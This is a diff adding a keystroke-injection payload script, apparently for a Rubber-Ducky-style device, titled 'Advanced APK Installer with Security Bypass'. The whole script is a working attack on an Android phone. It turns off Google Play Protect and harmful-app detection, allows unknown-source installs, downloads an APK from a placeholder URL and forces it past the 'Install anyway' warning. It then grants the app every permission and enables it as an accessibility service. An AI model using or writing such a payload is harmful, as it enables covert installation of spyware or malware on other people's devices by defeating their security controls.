@@ -1,0 +1,311 @@
+REM Advanced APK Installer with Security Bypass
+REM Author: AryanVBW
+REM Version: 1.0
+REM For Android 8-13 compatibility
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (universal method)
+SWIPE 500 1700 500 700
+DELAY 1500
+
+REM ---- STEP 1: DISABLE GOOGLE PLAY PROTECT ----
+
+REM Open Google Play Store
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING play store
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access user profile menu
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Go to Play Protect settings
+STRING play protect
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to settings gear icon
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable "Scan apps with Play Protect"
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm turning off
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable "Improve harmful app detection"
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 2: ENABLE UNKNOWN SOURCES ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps section
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Special app access (the path varies by Android version)
+SWIPE 500 1500 500 1000
+DELAY 1000
+STRING special
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Install unknown apps" or "Unknown sources"
+STRING unknown
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Chrome or browser to allow installing from unknown sources
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM ---- STEP 3: OPEN CHROME AND DOWNLOAD APK ----
+
+REM Open Chrome
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Clear any existing tabs or dialogs
+BACK
+DELAY 800
+
+REM Access the address bar
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter the direct APK URL (example URL - replace with actual URL)
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete
+DELAY 10000
+
+REM ---- STEP 4: INSTALL THE APK ----
+
+REM Click on the downloaded APK notification or open from Downloads
+SWIPE 500 0 500 1700
+DELAY 1500
+ENTER
+DELAY 3000
+
+REM Alternative: Open Downloads app
+BACK
+DELAY 800
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING downloads
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Tap on the downloaded APK
+ENTER
+DELAY 3000
+
+REM Click Install button
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM Handle "Install anyway" prompt if blocked by Play Protect
+TAB
+DELAY 300
+TAB
+DELAY 300
+STRING install anyway
+DELAY 800
+ENTER
+DELAY 5000
+
+REM Click Done or Open
+ENTER
+DELAY 2000
+
+REM ---- STEP 5: GRANT ALL PERMISSIONS ----
+
+REM Go to Settings again for permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Go to Apps section
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app (use generic search)
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions one by one
+REM This cycles through multiple common permissions
+
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 6: ENABLE ACCESSIBILITY SERVICES ----
+
+REM Go back to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accessibility
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the installed app in accessibility services
+SWIPE 500 1500 500 1000
+DELAY 1000
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable the accessibility service
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling service (may vary by device)
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 7: LAUNCH THE APP ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Search for the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM The app is now installed with all permissions granted and security bypassed
